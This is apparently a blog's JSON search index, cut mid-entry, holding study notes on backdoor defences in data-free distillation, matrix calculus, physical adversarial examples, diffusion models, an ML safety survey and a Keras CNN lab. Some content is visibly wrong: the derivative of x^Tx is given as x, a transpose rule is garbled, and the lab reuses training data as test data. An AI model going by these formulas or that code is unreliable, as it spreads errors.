Risks</span></h2><p>为了分析后门攻击对data free kd造成的影响，论文分别考虑了十种不同的后门攻击，从而训练出十种不同的poisoned teacher models。实验结果大致为data-free kd训练出的student model被后门攻击的成功率远大于普通KD（ASR高）</p>\n<h3><span id=\"造成该问题的两种潜在原因\">造成该问题的两种潜在原因</span></h3><h4><span id=\"bad-synthetic-input-supply\">Bad Synthetic Input Supply</span></h4><p>之所以student模型被后门攻击成功利用，是因为poisoned teacher models给student 模型提供了受污染的输入数据。<br>即受污染的teacher model会产生受污染的样本。</p>\n<h4><span id=\"bad-supervision\">Bad Supervision</span></h4><p>returned soft labels may contain backdoor knowledge and thus lead to bad students.<br>即teacher model产生的soft label可能包含后门信息。</p>\n<h4><span id=\"区别\">区别？</span></h4><p>前者关心student model输入数据被污染，而后者关注于整个监督学习的过程会由于teacher model而受影响。</p>\n<h2><span id=\"24-anti-backdoor-data-free-kd\">2.4 Anti-Backdoor Data-Free KD</span></h2><p>该方法主要由两个方面组成。</p>\n<h3><span id=\"shuffling-vaccine-sv\">Shuffling Vaccine (SV)</span></h3><p>作者认为后门的triggers通常是稀疏且不易被channel shuffling扰乱的。<br>假定如果某个样本在channel shuffling下可以被稳定地分到某一类，那么这个样本被视作poisoned 样本。<br>数学语言表达即为：</p>\n<script type=\"math/tex; mode=display\">\nS(x; \\hat{T}̃) = log D_{KL}(\\hat{T}(x)∥T (x)),</script><p>简单来讲即利用KL divergence来计算shuffled model和un-shuffled model间的区别，所以对于某个样本来讲如果值越小，就说明shuffle的影响越小，即越有可能为poisoned 样本。所以论文利用该方法来预测样本是否受到污染。<br>接着论文提出两种应用该思路的方法</p>\n<ol>\n<li><p>Suppressing backdoor generation</p>\n</li>\n<li><p>Suppressing suspicious distillation<br>与其直接把可疑样本抛弃，论文选择introduce a soft constraint以平衡实用性与安全性。</p>\n</li>\n</ol>\n<h3><span id=\"self-retrospection-sr\">Self-Retrospection (SR)</span></h3><p>stu模型生成被学习到的后门信息<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-08-14%20at%204.34.51%20AM.png\" alt=\"Screen Shot 2023-08-14 at 4.34.51 AM\"><br>$θ$即为要求的参数，这个方程简单来将就是找到一个能稳定触发backdoor 的噪音<br>$θ$即为参数，这个方程简单来将就是找到一个能稳定触发backdoor 的噪音<br>，使得每次KL divergence的值为最大。<br>然后优化$θ$。</p>\n<h3><span id=\"overall-pipeline\">Overall Pipeline</span></h3><p>将上述两种方法集成。<br>首先进行shuffle vaccine，如果找不到vaccine则使用Self-Retrospection 。<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-08-14%20at%208.45.46%20AM.png\" alt=\"Screen Shot 2023-08-14 at 8.45.46 AM\"></p>\n","categories":["ML"],"tags":["paper notes"]},{"title":"Matrix Derivation","url":"/2023/03/17/Math_Matrix%20Derivation/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script><br>\n    <div id=\"aplayer-EXansITA\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  </p>\n<h2><span id=\"11-basic-differentiation-rules\">1.1 Basic Differentiation Rules</span></h2><p>1)</p>\n<script type=\"math/tex; mode=display\">\nd(AX)=AdX[d\\left( {AX} \\right) = AdX]</script><p>2）</p>\n<script type=\"math/tex; mode=display\">\nd(X+Y)=dX+dY[d\\left( {X + Y} \\right) = dX + dY]</script><p>3）</p>\n<script type=\"math/tex; mode=display\">\nd(XY)=(dX)Y+X(dY)[d\\left( {XY} \\right) = \\left( {dX} \\right)Y + X\\left( {dY} \\right)]</script><p>4）</p>\n<script type=\"math/tex; mode=display\">\nd(XT)=(dX)T[d\\left(  \\right) = {\\left( {dX} \\right)^T}]</script><h4><span id=\"v2v-differentiation\">V2V Differentiation</span></h4><p>aussme x is a scalar, f is a i-dimension vector:</p>\n<script type=\"math/tex; mode=display\">\n\\frac{\\partial f_{p} } {\\partial x_{q}}  ={\\begin{bmatrix}\n\\frac{\\partial f_{1}} { \\partial x_{1}}  \\\\ \\frac{\\partial f_{2}} { \\partial x_{2}}   \\\\ \\frac{\\partial f_{3}} { \\partial x_{3}}  \\\\ \\dots \\\\ \\frac{\\partial f_{p}} { \\partial x_{q}} \n\\end{bmatrix}}</script><p>It is a p x q matrix.</p>\n<h2><span id=\"12-formulas\">1.2  Formulas</span></h2><h4><span id=\"121-primary-matrix\">1.2.1 Primary Matrix</span></h4><h5><span id=\"expression\">Expression</span></h5><script type=\"math/tex; mode=display\">\n\\frac{\\partial x^TA}{\\partial x} = \\frac{\\partial A^Tx}{\\partial x} =A</script><h5><span id=\"proof\">Proof</span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_7098.jpg\" alt=\"IMG_7098\"></p>\n<h4><span id=\"122-quadratic-matrix\">1.2.2 Quadratic Matrix</span></h4><h6><span id=\"1221\">1.2.2.1</span></h6><h5><span id=\"expression\">Expression</span></h5><script type=\"math/tex; mode=display\">\n\\frac{\\partial x^Tx}{\\partial x} = x</script><h5><span id=\"proof\">Proof</span></h5><p>omitted.</p>\n<h6><span id=\"1222\">1.2.2.2</span></h6><h5><span id=\"expression\">Expression</span></h5><script type=\"math/tex; mode=display\">\n\\frac{\\partial x^TAx}{\\partial x} = (A + A^T) x</script><h5><span id=\"proof\">Proof</span></h5><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_7100.jpg\" alt=\"IMG_7100\"></p>\n","categories":["ML"],"tags":["Math"]},{"title":"RP2 Generation","url":"/2023/03/15/Paper_Adversarial%20Examples%20in%20ML/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><a href=\"https://scholar.google.com/citations?view_op=view_citation&amp;hl=en&amp;user=Juoqtj8AAAAJ&amp;citation_for_view=Juoqtj8AAAAJ:4DMP91E08xMC\">Link of Paper</a> </p>\n<h2><span id=\"abstract\">Abstract</span></h2><p>Deep neural networks (DNNs) are vulnerable to adversarial examples.Sometimes in safety-critical situations, adversarial examples could _mislead_ these systems and cause dangerous situations.<br>Paper focus on the physical-world perturbations, introduce <strong>Robust Physical Perturbations </strong> to generate physical perturbations for physical-world objects that can consistently cause misclassification in a DNN-based classifier.</p>\n<h2><span id=\"related-work\">Related Work</span></h2><p>First the team survey some related works in the filed like:<br>1) Generating adversarial examples .(Tartget and Untarget attacks)<br>2) Digital Adversarial Examples (The importance of white- box setting)<br>3) Physical Adversarial Examples.(Formal adversarial example analysis )</p>\n<p>Then summarize their own work:<br>1) Choose a inherently unconstrained environment to guarantee the work is robust within diverse physical-world conditions.<br>1) Introduce the RP2 (**Robust Physical Perturbations )<br>2) Propose an evaluation methodolog to study the effectiveness of physical perturbations in real world scenarios.<br>3) The attacks toward two classifiers lead to a preemilent grade with high midclassify rate.<br>4) Show the generality with attack on microwave to misclassify it to a phone.</p>\n<h2><span id=\"algorithm\">Algorithm</span></h2><p>First index x to a perturbated image ,and  use $\\delta$ to label the perturbation.<br>so </p>\n<script type=\"math/tex; mode=display\">\nmin\\  H(x + \\delta,x),\\ \\  \\ s.t. \\ \\ \\ f_θ (x + \\delta) = y^*</script><p>Using a mask ,denoted by Mx , which is a  Matrix with same size to the classifier inputs, to apply to the original input to cause a misclassify.<br>So how to generate a robust Physical Perturbations with mask?<br>1) Find a vulnerable place to apply mask by using the L1 regularization.<br>2) Using NPS to address fabrication error.<br>3) Using Ti to considerate the transformations(e.g. if the object is rotated, the perturbation is rotated as well).</p>\n<h2><span id=\"experiment\">Experiment</span></h2><h3><span id=\"outcome\">Outcome</span></h3><h4><span id=\"lisa-cnn-and-gtsrb-cnn\">LISA-CNN and GTSRB-CNN</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-15%20at%207.53.19%20AM.png\" alt=\"Screen Shot 2023-03-15 at 7.53.19 AM\"></p>\n<h4><span id=\"lisa-cnn-with-poster-printed-stop-sign-and-a-real-stop-sign\">LISA-CNN with poster-printed Stop sign and a real Stop sign</span></h4><p>SL45 = Speed Limit 45, STP = Stop, YLD = Yield, ADL = Added Lane, SA = Signal Ahead, LE = Lane.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-15%20at%207.54.10%20AM.png\" alt=\"Screen Shot 2023-03-15 at 7.54.10 AM\"></p>\n<h4><span id=\"a-camouflage-art-attack-on-gtsrb-cnn\">A camouflage art attack on GTSRB-CNN</span></h4><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-15%20at%207.56.31%20AM.png\" alt=\"Screen Shot 2023-03-15 at 7.56.31 AM\"></p>\n<h2><span id=\"conclusion\">Conclusion</span></h2><p>The work introduce a high misclassify rate algorithm (RP2) with precise experiment to evident, and the results show that adversarial sample attacks in physical world will casu some serious consequence, thus future defenses should not rely on physical sources of noise as protection against physical adversarial examples.</p>\n","categories":["ML"],"tags":["paper analysis"]},{"title":"Basic Transformer","url":"/2023/03/18/Paper_Basic%20Transformer/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<p><a href=\"https://arxiv.org/abs/1706.03762\">Link</a></p>\n<h2><span id=\"0-preface\">0 Preface</span></h2><p>MLP -&gt; encode&amp;decoder -&gt; attention -&gt; self attention -&gt;transformer<br>epic jump!!!!<br>Orz……</p>\n<h3><span id=\"encodeampdecoder\">encode&amp;decoder</span></h3><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-18%20at%205.28.34%20PM.png\" alt=\"Screen Shot 2023-03-18 at 5.28.34 PM\"></p>\n<h2><span id=\"1-abstract\">1 Abstract</span></h2><h2><span id=\"2-introduction\">2 Introduction</span></h2><h2><span id=\"3-related-works\">3 Related works</span></h2><h2><span id=\"4-algorithm\">4 Algorithm</span></h2><h2><span id=\"5-conclusion\">5 Conclusion</span></h2>","categories":["ML"],"tags":["paper analysis"]},{"title":"Diffusion Models","url":"/2023/03/15/Paper_Diffusion%20Models/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"10-my-description\">1.0 My Description</span></h2><p>Diffussion Model is now a popluar model in the computer visual, with a high performance in image generazation, better than GAN.<br>In general, we can summarize this model ‘s outcome as “Generate image from the guassion noise backwards layer by layer”.<br>And The mathmatical principle somehow is not too abstract to understand(XD)</p>\n<h2><span id=\"20-basic-idea\">2.0 basic idea</span></h2><p>With a pure image,what we should do obey the following steps:<br>1) Apple guaasion noise to the image by T times,and each of the applied image with a exclusive label</p>\n<script type=\"math/tex; mode=display\">\nx_{n}</script><p>2) Gain the distribution of  </p>\n<script type=\"math/tex; mode=display\">\nq(x_{t}| x_{t-1})</script><p>3) Gain the expression of the distribution in backward </p>\n<script type=\"math/tex; mode=display\">\n   q(x_{t-1}| x_{t})</script><p>4) Predict the  </p>\n<script type=\"math/tex; mode=display\">\n   q(x_{t-1}| x_{t})</script><pre><code>by using deep netral network.\n</code></pre><h4><span id=\"detailed-mathmatical-caculation\">detailed mathmatical caculation</span></h4><p>upload for fun(ORZ</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_7077.png\" alt=\"IMG_7077\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_7084.jpg\" alt=\"IMG_7084\"></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/IMG_7079.png\" alt=\"IMG_7079\"></p>\n<h2><span id=\"realization-in-deep-learningmodel-trainting\">Realization in Deep Learning(Model Trainting )</span></h2><h4><span id=\"loss\">Loss</span></h4><script type=\"math/tex; mode=display\">\n</script>","categories":["ML"],"tags":["paper analysis"]},{"title":"Taxonomy of ML Safety","url":"/2023/03/15/Paper_Taxonomy%20of%20ML%20Safety/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h2><span id=\"1-overview\">1 Overview</span></h2><p>So the survay summarize various literatures and induct them with the following figure.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-15%20at%2010.53.15%20AM.png\" alt=\"Screen Shot 2023-03-15 at 10.53.15 AM\"></p>\n<p>The photo decomposes ML dependability needs into three safety strategies<br>1) Achieving inherently safe ML design.<br>2) Improving model performance and robustness.<br>3) Building runtime error detection solutions.</p>\n<p>Then ,for each of the strategies, the survey gives a detailed illustration and suggestion.</p>\n<h3><span id=\"ml-dependability-limitations\">ML Dependability Limitations</span></h3><p>1) Generalization Errors<br>2) Distribution Errors<br>3) Adversarial Errors</p>\n<h2><span id=\"2-ml-safety-taxonomy\">2 ML Safety Taxonomy</span></h2><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-15%20at%2011.12.44%20AM.png\" alt=\"Screen Shot 2023-03-15 at 11.12.44 AM\"></p>\n<p>The three items above are three categories the survey proposed.</p>\n<h3><span id=\"21-inheretly-safe-design\">2.1 Inheretly Safe Design</span></h3><p>1) Model transparency. — Human interpretability.<br>2) Formal specification.<br>3) Formal verification and testing.</p>\n<h3><span id=\"22-enhancing-performance-and-robustness\">2.2 Enhancing Performance and Robustness</span></h3><p>1) Robust Network Architecture<br>2) Robust Training<br>3) Data Sampling and Augmentation</p>\n<h3><span id=\"23-runtime-error-detection\">2.3 Runtime Error Detection</span></h3><p>1) Prediction Uncertainty<br>2) Out-of-distribution Detection<br>3) Adversarial Detection and Guards</p>\n<h2><span id=\"3-discussion-and-conclusions\">3 DISCUSSION AND CONCLUSIONS</span></h2><p>1) Engineering Standards Can Support ML Product Safety.<br>2) The Value of ML Safety Taxonomy.<br>3) Recommendations for Choosing ML Safety Strategies.<br>4) Recommendations for Safe AI Development Frameworks.</p>\n<h2><span id=\"4-my-comment\">4 My Comment</span></h2><p>Personly speaking I just got very CONFUSED when I finished this survey , I never reached the  filed like AI security (or safty) despite of a relatively deeper knowledge on the respective disciplines.<br>So the stuffs are quitly similar with a course I just accomplished -Reliabilty Enginneering—Give some criterions to judge the system’s performance, quality, or reliability, etc,<br>In my perspective, AI security maybe more “geek”. May like how to protect your data privacy, how to guarantee your trained model from not being stolen, or just how to denfense from a adversarial attack (BTW, This is a important part in the “strategies” ), or just some popluar conceptions like trustworthy AI system, ferdral learning denfense, etc.<br>But when  I finished this note ,I guessed, oh, it’s just a “safety strategies” , benifited some ML system designers , and “Provide them a better criterion to design the system”. So the true “security” maybe not insterest at the first two strategies at all, in other words,as for the AI security , the three categoies somehow too wide to be dug out, but all of the security problems can indeed be categorized in that three strategies.</p>\n<p>TL；DR: WO TAI CAI LA！！！！！</p>\n","categories":["ML"],"tags":["literature review"]},{"title":"lab_003_CNN","url":"/2023/02/27/ai_lab_note_001/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-cxoiyQPE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"0-preface\">0:    preface</span></h2><p>The article is a simple note for the online course of Nanyang TU about the ai lab, with the lessons of teaching pratical ways to analyze the existed datesheets using different tools such as oranges , pandas, etc.</p>\n<p>And it is meant to record some processes reviewing the course and finishing the homework. </p>\n<h2><span id=\"1-cnn-simple-description\">1:    CNN simple description</span></h2><p>(this content is not included in the course’s video )</p>\n<p>convelutional nerual network</p>\n<p>And the detailed instroduction of CNN will be scripted in another note of CS_329P_note.</p>\n<h2><span id=\"2-usage-of-keras\">2:     usage of keras</span></h2><p>We can make a concise introdauction to some important packages of keras.</p>\n<p>(I choose the chinese virson thus to gain a deeper understanding…)</p>\n<p><a href=\"https://keras.io/zh/\">https://keras.io/zh/</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%204.49.40%20PM.png\" alt=\"Screen Shot 2023-03-01 at 4.49.40 PM\"></p>\n<h3><span id=\"sequential\">Sequential</span></h3><h4><span id=\"import\">import</span></h4><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> keras.models <span class=\"keyword\">import</span> Sequential</span><br><span class=\"line\">model = Sequential()</span><br></pre></td></tr></table></figure>\n<p>sequenial model is one of the simplest model lapped by a plain stack of layers, we can use <code>keras.model</code> to create a blank sequential model.</p>\n<h4><span id=\"add\">add()</span></h4><p>with <code>.add()</code>, we can construct the model .</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> keras.layers <span class=\"keyword\">import</span> Dense</span><br><span class=\"line\">model.add(Dense(units=<span class=\"number\">64</span>, activation=<span class=\"string\">&#x27;relu&#x27;</span>, input_dim=<span class=\"number\">100</span>))</span><br><span class=\"line\">model.add(Dense(units=<span class=\"number\">10</span>, activation=<span class=\"string\">&#x27;softmax&#x27;</span>))</span><br></pre></td></tr></table></figure>\n<h4><span id=\"compile\">.compile()</span></h4><p>After construction, using <code>.compile()</code> to configurate the model .</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model.<span class=\"built_in\">compile</span>(loss=<span class=\"string\">&#x27;categorical_crossentropy&#x27;</span>,</span><br><span class=\"line\">              optimizer=<span class=\"string\">&#x27;sgd&#x27;</span>,</span><br><span class=\"line\">              metrics=[<span class=\"string\">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure>\n<h2><span id=\"3-pratical-examples\">3:     pratical examples</span></h2><h4><span id=\"datasheet-capture\">datasheet capture</span></h4><p>Firstly we can gain the datasheet in the url:<a href=\"https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia\">https://www.kaggle.com/datasets/paultimothymooney/chest-xray-pneumonia</a></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-02-27%20at%209.31.53%20PM.png\" alt=\"Screen Shot 2023-02-27 at 9.31.53 PM\"></p>\n<p>And the datas have already be processed into tables, we can use some tools to laod it directly.</p>\n<h4><span id=\"data-preprocessing\">data preprocessing</span></h4><p>To analyze this datasheet, first we should import some essential packages.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">b = <span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> keras.applications</span><br><span class=\"line\"><span class=\"keyword\">from</span> keras.applications <span class=\"keyword\">import</span> ResNet50</span><br><span class=\"line\"><span class=\"keyword\">from</span> keras.preprocessing.image <span class=\"keyword\">import</span> ImageDataGenerator</span><br><span class=\"line\"><span class=\"keyword\">from</span> keras.models <span class=\"keyword\">import</span> Sequential</span><br><span class=\"line\"><span class=\"keyword\">from</span> keras.layers <span class=\"keyword\">import</span> Conv2D,MaxPool2D,Flatten,Dense,Dropout,MaxPooling2D</span><br></pre></td></tr></table></figure>\n<p>The detailed descriptions about the  above packages mayvbe discussed latter ,but now let me load the datasheet firstly.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">train_dir = <span class=\"string\">r&quot;/Users/rin/Downloads/ml_003/chest_xray/train&quot;</span></span><br><span class=\"line\">train_data = ImageDataGenerator().flow_from_directory(train_dir,(<span class=\"number\">150</span>,<span class=\"number\">150</span>),shuffle=<span class=\"literal\">False</span>,batch_size=b)</span><br><span class=\"line\">test_data = ImageDataGenerator().flow_from_directory(train_dir,(<span class=\"number\">150</span>,<span class=\"number\">150</span>),shuffle=<span class=\"literal\">False</span>,batch_size=b)</span><br></pre></td></tr></table></figure>\n<p>so at that part the key class we have used is the <code>ImageDataGenerator()</code>, it will generate the image with the current data, and circle continually.</p>\n<p>In the above segment ,we reached the  <code>.flow_from_directory</code> method, with the first parameter of absolute address of data, (150,150) <code>target_size</code>, and <code>batch_size = 5</code>,and doesn’t shffule.</p>\n<p>The 150 <code>target_size</code> means that all of the photo’s size will be adjusted to (150,150),    and <code>batch_size</code> means the default size of a batch of data.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%205.13.39%20PM.png\" alt=\"Screen Shot 2023-03-01 at 5.13.39 PM\"></p>\n<p>After this process, we gain a batch of data which fullfil our requirement.</p>\n<h4><span id=\"model-construction\">model construction</span></h4><h5><span id=\"fisrt-layer\">fisrt layer</span></h5><p>Now we use the <code>Sequential</code> to create some proper model .</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model = Sequential()</span><br></pre></td></tr></table></figure>\n<p>If any warning occurs, we can simply run the following code to eliminate them.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\">os.environ[<span class=\"string\">&#x27;TF_CPP_MIN_LOG_LEVEL&#x27;</span>] = <span class=\"string\">&#x27;2&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>then</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model.add(Conv2D(<span class=\"number\">32</span>, (<span class=\"number\">3</span>, <span class=\"number\">3</span>), input_shape=(<span class=\"number\">150</span>, <span class=\"number\">150</span>, <span class=\"number\">3</span>), activation=<span class=\"string\">&#x27;relu&#x27;</span>))</span><br></pre></td></tr></table></figure>\n<p><code>Conv2D</code> is a 2D convolution layer ,first parameter means the input numbers, and second parameter is the <code>kernel_size</code> which means the length of one sigle convolution window.  <code>input_shape=(150,150,3)</code>represents it is the 150x150 size RGB images, <code>activation=&#39;relu&#39;</code> indicates the type of activation function.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%205.32.47%20PM.png\" alt=\"Screen Shot 2023-03-01 at 5.32.47 PM\"></p>\n<p>go on:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model.add(MaxPooling2D(pool_size=(<span class=\"number\">2</span>, <span class=\"number\">2</span>), strides=<span class=\"number\">2</span>))</span><br><span class=\"line\">model.add(Dropout(<span class=\"number\">0.05</span>))</span><br></pre></td></tr></table></figure>\n<p>function <code>MaxPooling2D</code>scaled shortens the size with 2 as the factor, with 2 length strides.</p>\n<p><code>Dropout</code> can randomly throw some of the input to avoid the overfitting,with of rate of 0.05.</p>\n<h5><span id=\"latter-layer\">latter layer</span></h5><p>using the similar code to create the all layers .</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 2nd layer</span></span><br><span class=\"line\">model.add(Conv2D(<span class=\"number\">32</span>, (<span class=\"number\">3</span>, <span class=\"number\">3</span>), activation=<span class=\"string\">&#x27;relu&#x27;</span>))</span><br><span class=\"line\">model.add(MaxPooling2D(pool_size=(<span class=\"number\">2</span>, <span class=\"number\">2</span>), strides=<span class=\"number\">2</span>))</span><br><span class=\"line\">model.add(Dropout(<span class=\"number\">0.05</span>))</span><br><span class=\"line\"><span class=\"comment\">#\t3rd layer</span></span><br><span class=\"line\">model.add(Conv2D(<span class=\"number\">64</span>, (<span class=\"number\">3</span>, <span class=\"number\">3</span>), activation=<span class=\"string\">&#x27;relu&#x27;</span>))</span><br><span class=\"line\">model.add(MaxPooling2D(pool_size=(<span class=\"number\">2</span>, <span class=\"number\">2</span>), strides=<span class=\"number\">2</span>))</span><br><span class=\"line\">model.add(Dropout(<span class=\"number\">0.05</span>))</span><br><span class=\"line\"><span class=\"comment\"># 4th layer</span></span><br><span class=\"line\">model.add(Conv2D(<span class=\"number\">64</span>, (<span class=\"number\">3</span>, <span class=\"number\">3</span>), activation=<span class=\"string\">&#x27;relu&#x27;</span>))</span><br><span class=\"line\">model.add(MaxPooling2D(pool_size=(<span class=\"number\">2</span>, <span class=\"number\">2</span>), strides=<span class=\"number\">2</span>))</span><br><span class=\"line\">model.add(Dropout(<span class=\"number\">0.05</span>))</span><br><span class=\"line\">model.add(Flatten())</span><br></pre></td></tr></table></figure>\n<p>the result as follows:</p>\n<p><img src=\"/Users/rin/Library/Application Support/typora-user-images/Screen Shot 2023-03-01 at 5.47.53 PM.png\" alt=\"Screen Shot 2023-03-01 at 5.47.53 PM\"></p>\n<p><code>mdoel.summary</code>help us to overview the image data we have generated.</p>\n<p>then we can use such datas to train the model.</p>\n<h3><span id=\"model-train\">model train</span></h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model.add(Dense(<span class=\"number\">128</span>, activation=<span class=\"string\">&#x27;relu&#x27;</span>))</span><br><span class=\"line\">model.add(Dropout(<span class=\"number\">0.05</span>))</span><br><span class=\"line\">model.add(Dense(<span class=\"number\">2</span>,activation=<span class=\"string\">&quot;softmax&quot;</span>))</span><br><span class=\"line\">model.summary()</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%207.27.05%20PM.png\" alt=\"Screen Shot 2023-03-01 at 7.27.05 PM\"></p>\n<h4><span id=\"softmax-activation-function\">softmax activation function</span></h4><p>converts a vector of <em>K</em> real numbers into a <a href=\"https://en.wikipedia.org/wiki/Probability_distribution\">probability distribution</a> of <em>K</em>possible outcomes. The softmax function is often used as the last <a href=\"https://en.wikipedia.org/wiki/Activation_function\">activation function</a> of a <a href=\"https://en.wikipedia.org/wiki/Artificial_neural_network\">neural network</a> to normalize the output of a network to a <a href=\"https://en.wikipedia.org/wiki/Probability_distribution\">probability distribution</a> over predicted output classes.</p>\n<p>(from Wikipedia)</p>\n<p>In a word , softmax can present the outcome of multi-classification as the form of probaility.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">model.<span class=\"built_in\">compile</span>(loss=<span class=\"string\">&quot;categorical_crossentropy&quot;</span>,optimizer=<span class=\"string\">&quot;adam&quot;</span>,metrics=[<span class=\"string\">&#x27;accuracy&#x27;</span>])</span><br></pre></td></tr></table></figure>\n<p>configurating our models.</p>\n<p>  <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%207.37.59%20PM.png\" alt=\"Screen Shot 2023-03-01 at 7.37.59 PM\"></p>\n<p>waiting some minutes, then plot the outacome out:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%207.38.45%20PM.png\" alt=\"Screen Shot 2023-03-01 at 7.38.45 PM\"></p>\n<h3><span id=\"result\">result</span></h3><p>import <code>matplotlib</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">plt.plot(h.history[&#x27;accuracy&#x27;])</span><br><span class=\"line\">#plt.plot(h.history[&#x27;val_accuracy&#x27;])</span><br><span class=\"line\">plt.title(&#x27;model accuracy&#x27;)</span><br><span class=\"line\">plt.ylabel(&#x27;accuracy&#x27;)</span><br><span class=\"line\">plt.xlabel(&#x27;epoch&#x27;)</span><br><span class=\"line\">plt.legend([&#x27;train&#x27;, &#x27;val&#x27;], loc=&#x27;upper left&#x27;)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure>\n<p>image:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-01%20at%207.42.21%20PM.png\" alt=\"Screen Shot 2023-03-01 at 7.42.21 PM\"></p>\n<figure class=\"highlight python\"><table><tr><td 